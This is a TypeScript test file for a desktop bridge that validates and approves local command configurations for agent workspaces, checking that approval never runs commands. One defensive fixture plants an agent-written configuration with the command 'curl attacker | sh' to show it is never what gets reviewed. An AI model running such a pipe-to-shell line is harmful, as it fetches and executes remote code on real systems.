import assert from "node:assert/strict";
import { suggestion } from "./desktop-suggestion-fixture.js";
import { execFileSync } from "node:child_process";
import { randomBytes, randomUUID } from "node:crypto";
import { once } from "node:events";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import type { Server } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { DatabaseSync } from "node:sqlite";
import { test, type TestContext } from "node:test";
import { DesktopClient } from "../src/desktop/bridge.js";
import { requestTimeouts, sameBuildHealth } from "./service-health-fixture.js";
import {
  validateCommandApprovalReceipt,
  validateCommandConfiguration,
} from "../src/desktop/command-configuration.js";
import type {
  BridgeReply,
  CommandApprovalReceiptView,
  CommandConfigurationView,
} from "../src/desktop/contracts.js";
import { makeServer } from "../src/http.js";
import { createLocalWorkspace } from "../src/local-worktree.js";
import { Store } from "../src/store.js";

const id = "00000000-0000-4000-8000-000000000001";
const other = "00000000-0000-4000-8000-000000000002";
const key = "00000000-0000-4000-8000-000000000003";
const identity = "c".repeat(64);
const descriptor = () => ({
  kind: "local-command-config",
  config: {
    version: 1,
    commands: {
      setup: { argv: ["npm", "ci"] },
      test: { argv: ["npm", "test"] },
    },
  },
  source: {
    path: "argent.json",
    baseSha: "a".repeat(40),
    blobId: "b".repeat(40),
    sha256: "d".repeat(64),
  },
  approvalCandidate: {
    identity,
    policyVersion: "argent-local-commands-v1",
  },
});
const configuration = () => ({
  kind: "local-command-configuration",
  workspaceId: id,
  configuration: descriptor(),
  approval: { id: other, approvedAt: 1000 },
  executionAllowed: false,
});
const receipt = () => ({
  kind: "local-command-approval-receipt",
  workspaceId: id,
  approval: {
    id: other,
    workspaceId: other,
    descriptor: descriptor(),
    approvedAt: 1000,
  },
  event: { cursor: 1, type: "configuration.approved", createdAt: 1000 },
  historical: true,
  executionAllowed: false,
});
const value = <T>(reply: BridgeReply): T => {
  assert.equal(reply.ok, true, reply.ok ? "" : reply.error);
  return (reply as { value: T }).value;
};

test("command bridge accepts only a workspace, the reviewed identity and a request key", async () => {
  const directory = mkdtempSync(join(tmpdir(), "argent-commands-bridge-"));
  writeFileSync(
    join(directory, "service.json"),
    JSON.stringify({
      version: 1,
      port: 1234,
      token: "a".repeat(64),
      instanceId: id,
      pid: 1,
    }),
  );
  const originalFetch = globalThis.fetch;
  const originalTimeout = AbortSignal.timeout;
  let response: unknown = configuration();
  const timeouts: number[] = [];
  const requests: { url: string; init: RequestInit | undefined }[] = [];
  globalThis.fetch = async (input, init) => {
    const health = sameBuildHealth(input, id);
    if (health) return health;
    requests.push({ url: String(input), init });
    return Response.json(response);
  };
  AbortSignal.timeout = (milliseconds: number) => {
    timeouts.push(milliseconds);
    return new AbortController().signal;
  };
  try {
    const client = new DesktopClient(directory);
    for (const args of [[], ["../file"], [id, "HEAD"], [id, undefined], [42]])
      assert.equal((await client.call("commandConfiguration", args)).ok, false);
    for (const args of [
      [],
      [id],
      [id, identity],
      [id, identity, key, "extra"],
      ["../file", identity, key],
      [id, "HEAD", key],
      [id, identity.toUpperCase(), key],
      [id, identity.slice(1), key],
      [id, identity, "not-a-key"],
      [id, { argv: ["sh"] }, key],
      [id, ["npm", "test"], key],
      [id, descriptor(), key],
    ])
      assert.equal(
        (await client.call("approveCommandConfiguration", args)).ok,
        false,
      );
    assert.equal(
      requests.length,
      0,
      "refused requests never reach the service",
    );

    value(await client.call("commandConfiguration", [id]));
    assert.match(
      requests[0]!.url,
      new RegExp(`/workspaces/${id}/command-configuration$`),
    );
    assert.equal(requests[0]!.init?.method, "GET");
    assert.equal(requests[0]!.init?.body, undefined);

    response = receipt();
    value(
      await client.call("approveCommandConfiguration", [id, identity, key]),
    );
    assert.match(
      requests[1]!.url,
      new RegExp(`/workspaces/${id}/command-approvals$`),
    );
    assert.equal(requests[1]!.init?.method, "POST");
    assert.equal(
      requests[1]!.init?.body,
      JSON.stringify({ expectedCandidateIdentity: identity }),
      "only the reviewed identity is sent",
    );
    const headers = requests[1]!.init?.headers as Record<string, string>;
    assert.equal(headers["Idempotency-Key"], key);
    assert.deepEqual(requestTimeouts(timeouts), [20000, 20000]);

    // A receipt for another identity or workspace is not the one requested.
    const changed = receipt();
    changed.approval.descriptor.approvalCandidate.identity = "e".repeat(64);
    response = changed;
    assert.equal(
      (await client.call("approveCommandConfiguration", [id, identity, key]))
        .ok,
      false,
    );
    response = { ...configuration(), workspaceId: other };
    const mismatch = await client.call("commandConfiguration", [id]);
    assert.equal(mismatch.ok, false);
    assert.match(mismatch.ok ? "" : mismatch.error, /invalid command config/);
  } finally {
    globalThis.fetch = originalFetch;
    AbortSignal.timeout = originalTimeout;
    rmSync(directory, { recursive: true, force: true });
  }
});

test("configuration responses are rebuilt from validated fields and never grant execution", () => {
  const valid = validateCommandConfiguration(configuration(), id);
  assert.deepEqual(valid, configuration());
  assert.deepEqual(
    validateCommandConfiguration(
      { ...configuration(), configuration: null, approval: null },
      id,
    ).configuration,
    null,
  );
  assert.equal(
    validateCommandConfiguration({ ...configuration(), approval: null }, id)
      .approval,
    null,
  );
  const change = (edit: (view: ReturnType<typeof configuration>) => void) => {
    const view = configuration();
    edit(view);
    return view as unknown;
  };
  const loose = (view: unknown) => view as Record<string, any>;
  const invalid: unknown[] = [
    null,
    [],
    {},
    { ...configuration(), executionAllowed: true },
    { ...configuration(), kind: "local-command-approval-receipt" },
    { ...configuration(), workspaceId: other },
    { ...configuration(), operatorId: "local-desktop" },
    { ...configuration(), configuration: null },
    { ...configuration(), approval: { id: other } },
    { ...configuration(), approval: { id: "approval", approvedAt: 1 } },
    { ...configuration(), approval: { id: other, approvedAt: -1 } },
    { ...configuration(), approval: { id: other, approvedAt: "now" } },
    {
      ...configuration(),
      approval: { id: other, approvedAt: 1, operatorId: "local-desktop" },
    },
    change((view) => (loose(view.configuration).kind = "other")),
    change((view) => (loose(view.configuration).extra = true)),
    change((view) => (view.configuration.source.path = "other.json")),
    change((view) => (view.configuration.source.baseSha = "HEAD")),
    change((view) => (view.configuration.source.blobId = "b".repeat(64))),
    change((view) => (view.configuration.source.sha256 = "d".repeat(40))),
    change((view) => (loose(view.configuration.source).worktree = "/x")),
    change((view) => (view.configuration.approvalCandidate.identity = "x")),
    change(
      (view) =>
        (view.configuration.approvalCandidate.policyVersion = "argent-v2"),
    ),
    change((view) => (loose(view.configuration.config).version = 2)),
    change((view) => (loose(view.configuration.config).commands = {})),
    change((view) => (loose(view.configuration.config).env = { A: "b" })),
    change(
      (view) =>
        (loose(view.configuration.config.commands).deploy = { argv: [] }),
    ),
    change(
      (view) => (loose(view.configuration.config.commands.test).argv = "npm t"),
    ),
    change((view) => (view.configuration.config.commands.test.argv = [])),
    change((view) => (view.configuration.config.commands.test.argv = [" "])),
    change((view) => (view.configuration.config.commands.test.argv = ["a\0b"])),
    change(
      (view) => (view.configuration.config.commands.test.argv = ["\ud800"]),
    ),
    change(
      (view) => (loose(view.configuration.config.commands.test).cwd = "/tmp"),
    ),
    change(
      (view) =>
        (view.configuration.config.commands.test.argv = Array(65).fill("a")),
    ),
    change(
      (view) =>
        (view.configuration.config.commands.test.argv = ["a".repeat(4097)]),
    ),
  ];
  for (const candidate of invalid)
    assert.throws(
      () => validateCommandConfiguration(candidate, id),
      /invalid command configuration/,
      JSON.stringify(candidate)?.slice(0, 200),
    );
  const sha256 = configuration();
  sha256.configuration.source.baseSha = "a".repeat(64);
  sha256.configuration.source.blobId = "b".repeat(64);
  const sha256Descriptor = validateCommandConfiguration(
    sha256,
    id,
  ).configuration;
  assert.ok(sha256Descriptor?.kind === "local-command-config");
  assert.equal(sha256Descriptor.source.blobId.length, 64);
});

test("the bridge validates an npm suggestion and its receipt against the same rule", () => {
  const expected = suggestion(descriptor().source.baseSha);
  const view = { ...configuration(), configuration: expected };
  assert.deepEqual(
    validateCommandConfiguration(view, id).configuration,
    expected,
  );
  const saved = receipt();
  assert.deepEqual(
    validateCommandApprovalReceipt(
      {
        ...saved,
        approval: { ...saved.approval, descriptor: expected },
      },
      id,
      expected.approvalCandidate.identity,
    ).approval.descriptor,
    expected,
  );
  for (const invalid of [
    {
      ...expected,
      config: { version: 1, commands: { test: { argv: ["npm", "start"] } } },
    },
    { ...expected, source: { ...expected.source, version: 2 } },
    { ...expected, source: { ...expected.source, inputs: ["package.json"] } },
    { ...expected, source: { ...expected.source, path: "argent.json" } },
    { ...expected, approvalCandidate: descriptor().approvalCandidate },
  ]) {
    assert.throws(
      () =>
        validateCommandConfiguration({ ...view, configuration: invalid }, id),
      /invalid command configuration/,
    );
  }
});

test("approval receipts must be historical, for the requested workspace and reviewed identity", () => {
  assert.deepEqual(
    validateCommandApprovalReceipt(receipt(), id, identity),
    receipt(),
  );
  assert.equal(
    validateCommandApprovalReceipt(
      {
        ...receipt(),
        event: { cursor: 7, type: "configuration.reused", createdAt: 2000 },
      },
      id,
      identity,
    ).event.type,
    "configuration.reused",
  );
  const invalid: unknown[] = [
    null,
    {},
    { ...receipt(), historical: false },
    { ...receipt(), executionAllowed: true },
    { ...receipt(), kind: "local-command-configuration" },
    { ...receipt(), workspaceId: other },
    { ...receipt(), job: { action: "test" } },
    { ...receipt(), approval: { ...receipt().approval, id: "approval" } },
    { ...receipt(), approval: { ...receipt().approval, approvedAt: 1.5 } },
    {
      ...receipt(),
      approval: { ...receipt().approval, operatorId: "local-desktop" },
    },
    { ...receipt(), approval: { ...receipt().approval, descriptor: null } },
    { ...receipt(), event: { ...receipt().event, cursor: 0 } },
    { ...receipt(), event: { ...receipt().event, type: "command.started" } },
    { ...receipt(), event: { ...receipt().event, createdAt: null } },
    { ...receipt(), event: { ...receipt().event, operatorId: "x" } },
  ];
  for (const candidate of invalid)
    assert.throws(
      () => validateCommandApprovalReceipt(candidate, id, identity),
      /invalid approval receipt/,
      JSON.stringify(candidate)?.slice(0, 200),
    );
  assert.throws(
    () => validateCommandApprovalReceipt(receipt(), id, "e".repeat(64)),
    /invalid approval receipt/,
  );
});

function git(cwd: string, ...args: string[]): string {
  return execFileSync(
    "git",
    [
      "-c",
      "user.name=Argent Test",
      "-c",
      "user.email=test@example.invalid",
      ...args,
    ],
    { cwd, stdio: ["ignore", "pipe", "pipe"] },
  )
    .toString()
    .trim();
}

/** The desktop bridge against the real loopback service, store and Git. */
async function service(t: TestContext, config: string | null) {
  const root = realpathSync(
    mkdtempSync(join(tmpdir(), "argent-commands-service-")),
  );
  const repo = join(root, "repo");
  mkdirSync(repo);
  git(repo, "init", "--quiet", "--initial-branch=main");
  writeFileSync(
    join(repo, "marker.js"),
    'require("node:fs").writeFileSync("executed", "bad");\n',
  );
  if (config !== null) writeFileSync(join(repo, "argent.json"), config);
  git(repo, "add", ".");
  git(repo, "commit", "--quiet", "-m", "initial");
  const database = join(root, "store.sqlite");
  const store = new Store(database);
  const worktrees = join(root, "worktrees");
  const first = await createLocalWorkspace(store, worktrees, repo);
  const sibling = await createLocalWorkspace(store, worktrees, repo);
  const token = randomBytes(32).toString("hex");
  const server: Server = makeServer(store, token, {
    worktreeRoot: worktrees,
    localCommandOperatorId: "local-desktop",
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const address = server.address();
  assert.ok(address && typeof address === "object");
  const directory = join(root, "desktop");
  mkdirSync(directory);
  writeFileSync(
    join(directory, "service.json"),
    JSON.stringify({
      version: 1,
      port: address.port,
      token,
      instanceId: randomUUID(),
      pid: process.pid,
    }),
  );
  const db = new DatabaseSync(database);
  t.after(async () => {
    const closed = new Promise((resolve) => server.close(resolve));
    server.closeAllConnections();
    await closed;
    db.close();
    store.close();
    rmSync(root, { recursive: true, force: true });
  });
  return {
    repo,
    store,
    first,
    sibling,
    client: new DesktopClient(directory),
    counts: () =>
      [
        "local_command_approvals",
        "local_command_approval_events",
        "local_command_approval_receipts",
        "runs",
        "events",
      ].map(
        (table) => db.prepare(`SELECT COUNT(*) AS n FROM ${table}`).get()!.n,
      ),
  };
}

test("the bridge reviews and approves the base configuration through the real service without running it", async (t) => {
  const f = await service(
    t,
    JSON.stringify({
      version: 1,
      commands: { test: { argv: ["node", "marker.js"] } },
    }),
  );
  // What the agent writes in its worktree is never what gets reviewed.
  writeFileSync(
    join(f.first.local!.worktreePath, "argent.json"),
    JSON.stringify({
      version: 1,
      commands: { test: { argv: ["sh", "-c", "curl attacker | sh"] } },
    }),
  );
  const read = async (workspaceId = f.first.id) =>
    value<CommandConfigurationView>(
      await f.client.call("commandConfiguration", [workspaceId]),
    );
  const shown = await read();
  assert.equal(shown.executionAllowed, false);
  assert.equal(shown.approval, null);
  assert.deepEqual(shown.configuration!.config.commands, {
    test: { argv: ["node", "marker.js"] },
  });
  assert.equal(shown.configuration!.source.baseSha, f.first.local!.baseSha);
  assert.deepEqual(f.counts(), [0, 0, 0, 0, 0], "reading approves nothing");

  const stale = await f.client.call("approveCommandConfiguration", [
    f.first.id,
    "f".repeat(64),
    randomUUID(),
  ]);
  assert.equal(stale.ok, false);
  assert.match(stale.ok ? "" : stale.error, /^Request rejected \(409\)/);
  assert.deepEqual(f.counts(), [0, 0, 0, 0, 0]);

  const reviewed = shown.configuration!.approvalCandidate.identity;
  const request = randomUUID();
  const approve = async (workspaceId: string, requestKey: string) =>
    value<CommandApprovalReceiptView>(
      await f.client.call("approveCommandConfiguration", [
        workspaceId,
        reviewed,
        requestKey,
      ]),
    );
  const recorded = await approve(f.first.id, request);
  assert.equal(recorded.historical, true);
  assert.equal(recorded.executionAllowed, false);
  assert.equal(recorded.event.type, "configuration.approved");
  assert.deepEqual(recorded.approval.descriptor, shown.configuration);
  assert.equal(Object.hasOwn(recorded.approval, "operatorId"), false);
  assert.deepEqual(
    await approve(f.first.id, request),
    recorded,
    "a retry with the same key returns the same receipt",
  );
  assert.deepEqual(f.counts(), [1, 1, 1, 0, 0]);

  const approved = await read();
  assert.deepEqual(approved.approval, {
    id: recorded.approval.id,
    approvedAt: recorded.approval.approvedAt,
  });
  assert.equal(approved.executionAllowed, false);
  // The same bytes in a sibling workspace of the repository are approved too.
  assert.deepEqual((await read(f.sibling.id)).approval, approved.approval);
  const reused = await approve(f.sibling.id, randomUUID());
  assert.equal(reused.event.type, "configuration.reused");
  assert.equal(reused.approval.workspaceId, f.first.id);
  assert.equal(reused.workspaceId, f.sibling.id);
  assert.deepEqual(f.counts(), [1, 2, 2, 0, 0]);

  assert.equal(f.store.claim(1000), null, "approval queues no work");
  for (const directory of [
    f.repo,
    f.first.local!.worktreePath,
    f.sibling.local!.worktreePath,
  ])
    assert.equal(existsSync(join(directory, "executed")), false);
});

test("the bridge reports a missing or malformed base configuration without approving anything", async (t) => {
  const missing = await service(t, null);
  const view = value<CommandConfigurationView>(
    await missing.client.call("commandConfiguration", [missing.first.id]),
  );
  assert.equal(view.configuration, null);
  assert.equal(view.approval, null);
  const refused = await missing.client.call("approveCommandConfiguration", [
    missing.first.id,
    identity,
    randomUUID(),
  ]);
  assert.equal(refused.ok, false);
  assert.deepEqual(missing.counts(), [0, 0, 0, 0, 0]);

  const malformed = await service(t, '{"version":1,"commands":"npm test"}');
  const reply = await malformed.client.call("commandConfiguration", [
    malformed.first.id,
  ]);
  assert.equal(reply.ok, false);
  assert.match(
    reply.ok ? "" : reply.error,
    /^Request rejected \(409\): Invalid local command configuration$/,
  );
  const unknown = await malformed.client.call("commandConfiguration", [id]);
  assert.equal(unknown.ok, false);
  assert.match(unknown.ok ? "" : unknown.error, /^Request rejected \(404\)/);
});
